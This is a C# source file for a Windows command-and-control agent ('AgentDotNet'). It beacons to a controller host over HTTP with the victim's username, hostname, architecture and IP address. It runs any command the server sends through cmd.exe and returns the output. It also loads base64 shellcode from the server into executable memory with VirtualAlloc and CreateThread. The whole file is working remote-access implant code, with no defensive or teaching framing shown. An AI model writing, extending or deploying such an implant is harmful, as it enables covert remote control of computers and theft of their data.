using System.Diagnostics;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json.Nodes;

namespace AgentDotNet
{
    internal class Program
    {
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr addr, uint size, uint type, uint protect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr attr, uint stack, IntPtr start, IntPtr param, uint flags, IntPtr tid);

        static readonly HttpClient httpClient = new HttpClient();

        static void Main(string[] args)
        {
            if (args.Length != 2)
            {
                Console.WriteLine("Usage: AgentDotNet <controller_host> <controller_port>");
                return;
            }

            string serverUrl = $"http://{args[0]}:{args[1]}/";
            string guid = Guid.NewGuid().ToString();
            int sleepMs = 2000;
            string? result = null;
            string username = Environment.UserName;
            string hostname = Environment.MachineName;
            string agentOs = "WINDOWS";
            string processArch = Environment.Is64BitProcess ? "x64" : "x86";
            string? ips = null;
            try
            {
                var host = System.Net.Dns.GetHostEntry(System.Net.Dns.GetHostName());
                foreach (var addr in host.AddressList)
                {
                    if (addr.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork
                        && addr.ToString() != "127.0.0.1")
                    {
                        ips = addr.ToString();
                        break;
                    }
                }
            }
            catch { }

            Console.WriteLine($"[agent] id={guid}, polling {serverUrl} every {sleepMs}ms");

            while (true)
            {
                try
                {
                    var data = new JsonObject
                    {
                        ["id"] = guid,
                        ["type"] = "dotNET",
                        ["username"] = username,
                        ["hostname"] = hostname,
                        ["os"] = agentOs,
                        ["processArch"] = processArch,
                        ["ips"] = ips,
                    };
                    if (result != null)
                        data["result"] = result;

                    JsonObject? responseData = null;
                    try
                    {
                        var content = new StringContent(
                            data.ToJsonString(),
                            Encoding.UTF8,
                            "application/json"
                        );
                        var response = httpClient.PostAsync(serverUrl, content).Result;
                        response.EnsureSuccessStatusCode();
                        string body = response.Content.ReadAsStringAsync().Result;
                        result = null;
                        responseData = JsonNode.Parse(body)?.AsObject();
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"[agent] Connection failed: {ex.Message}");
                        Thread.Sleep(sleepMs);
                        continue;
                    }

                    if (responseData == null || !responseData.ContainsKey("__type__"))
                    {
                        Thread.Sleep(sleepMs);
                        continue;
                    }

                    string cmdType = responseData["__type__"]!.ToString();
                    Console.WriteLine($"[agent] Received command: {cmdType}");

                    if (cmdType == "my_what")
                    {
                        result = "I'm a C# agent";
                    }
                    else if (cmdType == "my_sleep")
                    {
                        sleepMs = int.Parse(responseData["sleep"]!.ToString()) * 1000;
                        Console.WriteLine($"[agent] Sleep changed to {sleepMs}ms");
                        result = $"New sleep is {sleepMs}ms";
                    }
                    else if (cmdType == "my_terminal")
                    {
                        string cmd = responseData["command"]!.ToString();
                        Console.WriteLine($"[agent] Running: {cmd}");
                        var process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + cmd;
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.Start();
                        var stderrTask = process.StandardError.ReadToEndAsync();
                        string stdout = process.StandardOutput.ReadToEnd();
                        string stderr = stderrTask.Result;
                        if (!process.WaitForExit(30000))
                        {
                            process.Kill();
                            result = stdout + stderr + "\n[timed out after 30s]";
                        }
                        else
                        {
                            result = stdout + stderr;
                        }
                    }
                    else if (cmdType == "my_spawn")
                    {
                        byte[] shellcode = Convert.FromBase64String(responseData["shellcode"]!.ToString());
                        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);
                        if (addr == IntPtr.Zero)
                        {
                            result = $"VirtualAlloc failed for {shellcode.Length} bytes";
                        }
                        else
                        {
                            Marshal.Copy(shellcode, 0, addr, shellcode.Length);
                            CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
                            result = $"spawned thread for {shellcode.Length} bytes shellcode";
                        }
                    }
                    else if (cmdType == "my_eval")
                    {
                        result = "C# agent does not support eval";
                    }
                    else
                    {
                        result = $"Unknown command type: {cmdType}";
                    }
                }
                catch (Exception e)
                {
                    Console.WriteLine($"[agent] Error: {e.Message}");
                    if (result == null)
                        result = e.Message;
                }
                Thread.Sleep(sleepMs);
            }
        }
    }
}
